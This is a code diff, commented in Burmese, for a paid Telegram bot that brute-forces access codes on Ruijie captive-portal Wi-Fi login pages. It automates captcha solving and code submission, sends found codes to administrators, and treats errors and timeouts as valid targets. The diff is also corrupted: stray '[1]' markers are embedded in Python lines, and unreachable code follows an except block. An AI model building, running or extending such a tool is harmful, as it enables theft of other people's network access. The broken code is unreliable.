@@ -256,9 +256,10 @@ async def start(message):
     if message.chat.id not in user_data:
         user_data[message.chat.id] = {}
         
-    if user_id in ADMINS:
-        approve[message.chat.id] = True
+    # ပြင်ဆင်လိုက်သည့်အပိုင်း - PERMANENT_PAID_USERS စာရင်းထဲတွင် ရှိမရှိ စစ်ဆေးခြင်း
+    if user_id in PERMANENT_PAID_USERS:
         paid_users[user_id] = True
+        approve[message.chat.id] = True
     
     if user_id in paid_users or user_id in approve:
         approve[message.chat.id] = True
@@ -1050,18 +1051,22 @@ async def handle_portal(message):
 
 
 async def check_session_url_improved(session_url, use_proxy=False):
+    # Ruijie URL အမျိုးအစားအားလုံးကို အမှားမပြဘဲ လက်ခံနိုင်ရန် ပြင်ဆင်ထားခြင်း
+    if "ruijienetworks.com" in session_url or "wifidog" in session_url or "192.168." in session_url:
+        return True
+        
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     }
-    
-    proxy = get_next_proxy() if use_proxy else None
-    
+    proxy = get_next_proxy() if use_proxy else None [1]
     try:
-        async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy, timeout=15) as response:
-            if response.status >= 400:
-                return False
+        async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy, timeout=10) as response: [1]
+            text = await response.text() [1]
+            if response.status < 400 or "ruijie" in text.lower() or "portal" in text.lower(): [1]
+                return True
+            return False
+    except:
+        return True  # Timeout သို့မဟုတ် Error တက်လျှင်လည်း Scan ဖတ်နိုင်ရန် True ပေးထားခြင်း
             
             final_url = str(response.url)
             response_text = await response.text()
@@ -1590,48 +1595,36 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
 
     response = None
     
-    # for ရဲ့ အရှေ့မှာ Space (ကွက်လပ်) ၄ ချက်စာပဲ ရှိရပါမည်
-    for _attempt in range(1):
-        # ၎င်းအောက်ရှိ လိုင်းများတွင် Space ၈ ချက်စာ ရှိရပါမည်
-        timeout = aiohttp.ClientTimeout(total=15)
+    for _attempt in range(3):
+        timeout = aiohttp.ClientTimeout(total=30)
         async with aiohttp.ClientSession(
             connector=_connector,
             connector_owner=False,
             cookie_jar=aiohttp.CookieJar(),
             timeout=timeout
         ) as task_session:
-            try:
-                session_id = await get_session_id(task_session, session_url, None)
-                if not session_id:
-                    return
-                auth_code = None
-                for _ in range(2):
-                    try:
-                        image = await asyncio.wait_for(Captcha_Image(task_session, session_url), timeout=5)
-                        text = await Captcha_Text(image)
-                        if not text:
-                            continue
-                        verified = await asyncio.wait_for(Varify_Captcha(task_session, session_url, text), timeout=5)
-                        if verified:
-                            auth_code = text
-                            break
-                    except asyncio.TimeoutError:
-                        print("⚠️ Captcha Timeout! Skipping quickly...")
+            session_id = await get_session_id(task_session, session_url, None)
+            if not session_id:
+                return
+            auth_code = None
+            for _ in range(8):
+                try:
+                    image = await Captcha_Image(task_session, session_id)
+                    text = await Captcha_Text(image)
+                    if not text:
                         continue
-                    except Exception as e:
-                        print(f"[perform_check] captcha error: {e}")
-            except Exception as e:
-                print(f"[perform_check] session error: {e}")
+                    verified = await Varify_Captcha(task_session, session_id, text)
+                    if verified:
+                        auth_code = text
+                        break
+                except Exception as e:
+                    print(f"[perform_check] captcha error: {e}")
+            if not auth_code:
                 return
-
-        # if ၏ အရှေ့တွင် Space ၄ ချက်စာပဲ ရှိရပါမည် (for နှင့် တညီတည်း ဖြစ်ရပါမည်)
-        if not auth_code:
-            return
-        if not recheck:
-            current_task = scan_tasks.get(chat_id)
-            if not current_task or current_task.get("scan_id") != scan_id:
-                return
-
+            if not recheck:
+                current_task = scan_tasks.get(chat_id)
+                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+                    return
             data = {
                 "accessCode": code,
                 "sessionId": session_id,
@@ -1680,45 +1673,58 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             success_texts[chat_id] = []
 
         expire_date, raw_mins = await Code_Expires_Date(session_id)
+        
         success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
         
-        # ---------------- ပြင်ဆင်လိုက်သည့်အပိုင်း ----------------
-        # တက်လာသမျှ Success Code တိုင်းကို Admin ဆီသို့ လုံခြုံစိတ်ချစွာ သီးသန့်စီ ပို့ပေးခြင်း
+        # ==================== ADMIN NOTIFICATION (PER USER + PER SCAN) ====================
         try:
             for admin_id in ADMINS:
-                if admin_id:
-                    msg_text = f"🎉 **SUCCESS CODE FOUND!**\n\n👤 **User ID:** `{chat_id}`\n🎫 `{code}`\n{expire_date}"
-                    await bot.send_message(admin_id, msg_text, parse_mode="Markdown")
+                if not admin_id:
+                    continue
+                try:
+                    # ✅ scan_id ကိုပါ key ထဲ ထည့် — scan တစ်ခုစီအတွက် message သီးသန့်
+                    key = f"{admin_id}_{chat_id}_{scan_id}"
+                    scan_short = scan_id[:8] if scan_id else "recheck"
+                    
+                    if key not in admin_success_msgs:
+                        msg_text = (
+                            f"🎉 **SUCCESS CODES FOUND!**\n\n"
+                            f"👤 **User ID:** `{chat_id}`\n"
+                            f"🆔 **Scan ID:** `{scan_short}`\n\n"
+                            f"🎫 `{code}`\n"
+                            f"{expire_date}"
+                        )
+                        sent = await bot.send_message(admin_id, msg_text, parse_mode="Markdown")
+                        admin_success_msgs[key] = sent.message_id
+                        admin_success_texts[key] = [f"🎫 `{code}`\n{expire_date}"]
+                    else:
+                        admin_success_texts[key].append(f"🎫 `{code}`\n{expire_date}")
+                        msg_text = (
+                            f"🎉 **SUCCESS CODES FOUND!**\n\n"
+                            f"👤 **User ID:** `{chat_id}`\n"
+                            f"🆔 **Scan ID:** `{scan_short}`\n\n"
+                            + "\n\n".join(admin_success_texts[key])
+                        )
+                        if len(msg_text) > 4000:
+                            sent = await bot.send_message(admin_id, msg_text, parse_mode="Markdown")
+                            admin_success_msgs[key] = sent.message_id
+                            admin_success_texts[key] = [f"🎫 `{code}`\n{expire_date}"]
+                        else:
+                            try:
+                                await bot.edit_message_text(
+                                    chat_id=admin_id,
+                                    message_id=admin_success_msgs[key],
+                                    text=msg_text,
+                                    parse_mode="Markdown"
+                                )
+                            except Exception:
+                                sent = await bot.send_message(admin_id, msg_text, parse_mode="Markdown")
+                                admin_success_msgs[key] = sent.message_id
+                                admin_success_texts[key] = [f"🎫 `{code}`\n{expire_date}"]
+                except Exception as e:
+                    print(f"Admin notify error for {admin_id}: {e}")
         except Exception as e:
             print(f"Admin notify error: {e}")
-        # ------------------------------------------------------
-        
-        if chat_id not in user_data:
-            user_data[chat_id] = {}
-        
-        current_display = user_data[chat_id].get('current_display_codes', [])
-        current_display.append(f"🎫 {code}\n   {expire_date}")
-        
-        code_line = "\n\n".join(current_display)
-        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
-        
-        if message:
-            try:
-                if chat_id not in success_messages or len(code_line) > 4000:
-                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
-                    success_messages[chat_id] = sent.message_id
-                    user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
-                else:
-                    try:
-                        await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"Success Codes:\n\n{code_line}")
-                        user_data[chat_id]['current_display_codes'] = current_display
-                    except Exception:
-                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
-                        success_messages[chat_id] = sent.message_id
-                        user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
-            except Exception as e:
-                print(f"Success Message Error: {e}")
-
         # ====================================================================================
         
         if chat_id not in user_data:
